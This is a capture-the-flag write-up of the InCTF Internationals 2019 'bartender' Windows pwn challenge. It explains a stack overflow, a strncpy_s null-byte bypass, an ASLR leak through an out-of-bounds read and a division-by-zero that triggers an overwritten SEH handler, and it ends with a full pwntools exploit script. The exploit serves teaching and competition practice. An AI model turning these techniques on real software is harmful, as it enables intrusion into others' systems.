# bartender - InCTF Internationals 2019

[ slashb4sh](https://twitter.com/slashb4sh)

 2019-10-11

[ Pwn / Windows](https://blog.bi0s.in/categories/Pwn/Windows/)

 152642

------

Writeup from InCTFi 2019 bartender

tl;dr Windows 32-bit SEH exploitation



**Category:** Pwn
**Challenge Points:** 1000
**Solves:** 1

The challenge is a 32-bit windows executable. This is a simple windows exploiation challenge based on the Structured Exception Handling. Download the files [here](https://gitlab.com/maheshhari/pwn/tree/master/InCTFi2019/bartender)

# Write-up

```
PS D:\Downloads\Win_BE\bartender> .\bartender.exe
Welcome!! Hope you have a good time
What would you like
        1. Make a drink
        2. Look at menu
        3. Change a drink
        4. Serve drinks
        5. Add an Ingredient
        6. Leave bar
Enter your choice :
```

A `setting.xml` was given with the handout

```
<?xml version="1.0" encoding="UTF-8"?>
<MitigationPolicy>
  <SystemConfig>
    <SEHOP Enable="false" TelemetryOnly="false" />
  </SystemConfig>
  <AppConfig Executable="C:\Users\Public\bartender\bartender.exe">
    <SEHOP Enable="false" TelemetryOnly="false" />
  </AppConfig>
</MitigationPolicy>
```

This file was given to inform that SEHOP was disabled in remote Windows server.

This is a menu driven program, you can create a drink, modify a drink and so on. The drinks and ingredients are stored as an global array.

```
struct ingredient{
	char *name;
	DWORD key;
};

struct drink{
	char *name;
	DWORD value;
};

struct ingredient shelf[LEN];
struct drink *drinks[LEN];
```

When you make a drink, you get to add ingredients with a key that is a unique and prime number. The ingredient->key of all the ingredients you select are multiplied to from drink->value. Since the keys are prime numbers, the ingredients can be indentified by checking if the value is completely divisible by the key.

You can also see that a `catFlag` function is given to make exploitation easy.

##### Vulnerabilities

- `Stack Bufferoverflow` in the `add Ingredient` function.
- `Out of Bounds` read in `make drink` functionality.

##### Exploitaiton

First thing you would notice is the `stack bufferflow` that can be seen in the `add ingredient` option. You cannot exploit this bug by straightaway as stack cookies are enabled and also the main function doesn’t return as it is an while loop that terminates only when `exit` is called.

Also when you are overflowing, a stack buffer overrun error is returned in the `addIngredient` function call. This is because `strncpy_s` is used to copy name of the ingredient to heap.

```
errno_t strncpy_s(
   char *strDest,
   size_t numberOfElements,
   const char *strSource,
   size_t count
);
```

`strncpy_s` checks if the len of the src is greater than the count. Check out the [docs for strncpy_s](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strncpy-s-strncpy-s-l-wcsncpy-s-wcsncpy-s-l-mbsncpy-s-mbsncpy-s-l?view=vs-2019) to know more.
To bypass this, all you have to do is put a `\x00` in your exploit, such that the the len of the src is less than count.
You are able to overwrite the SEH handler with this overflow now, but you still have to trigger an exception to redirect to execution flow to overwritten handler.

`/SAFESEH:NO` compiler flag is also enabled, you check this by looking for the `__safe_seh_table` which will not be present if safeSEH is disabled. If enabled, the last two bytes of the exception handlers in the exception chain are stored in the table, and validity is checked before a exception call.

There is a `division by zero` bug in the `change drink` functionality when you give 0 as an option when removing an ingredient. You can use this bug to trigger the overwritten exception handler.

Now all you have to do is overwrite the SEH handler with address of `catFlag`.
`ASLR` is enabled though. In Windows ASLR randomizes the image base everytime it is loaded into memory and this includes the executable image. You can use the .data section `out of bound` read vulnerability in the `make drink` functionality. The index read from the user is not validated. When you select an ingredient the key of that indredient->key([ingredient+4]) is used to form the drink->value. Provide an index such that the address+4 points to a image address. This address gets multiplied with drink->value and hence the image leak is obtained.

Finally you can overwrite the SE handler with `catFlag` and trigger the exception to get the flag.

```
from pwn import *

bin_path = "./bartender.exe"
s=process(bin_path)
#s=remote("34.207.98.167",1414)

def trigger():
    s.recvuntil("Enter your choice : ")
    s.sendline(str(3))
    s.recvuntil("Which drink do you want to change :")
    s.sendline(str(0))
    s.recvuntil("What change : ")
    s.sendline(str(2))
    s.recvuntil("Select the ingredients to remove : ")
    s.sendline(str(0))

def setup(exploit):
    s.recvuntil("Enter your choice : ")
    s.sendline(str(5))
    s.recvuntil("Enter the name of the ingredient :")
    s.send(exploit)
    s.recvuntil("Enter your choice : ")
    s.sendline(str(1))
    s.recvuntil("Enter Drink name : ")
    s.sendline("Rum N Cola ")
    s.recvuntil("Select the ingredients :")
    s.sendline(str(1))
    s.recvuntil("Select the ingredients :")
    s.sendline(str(99))

def leak_base():
    s.recvuntil("Enter your choice : ")
    s.sendline(str(1))
    s.recvuntil("Enter Drink name : ")
    s.sendline("base ")
    s.recvuntil("Select the ingredients : ")
    s.sendline(str(int("0xfffffdb5",16)))
    s.recvuntil("Current price = ")
    base = int(s.recvline())-8472
    log.info("base = " + hex(base))
    s.recvuntil("Select the ingredients :")
    s.sendline(str(99))
    return base


base=leak_base()
catFlag=base+4544
exploit = p32(0x42424242)*4 + "\x01" + "c"*0x4c + "d"*3 + p32(catFlag) + "a"*4
setup(exploit)
trigger()
s.interactive()
```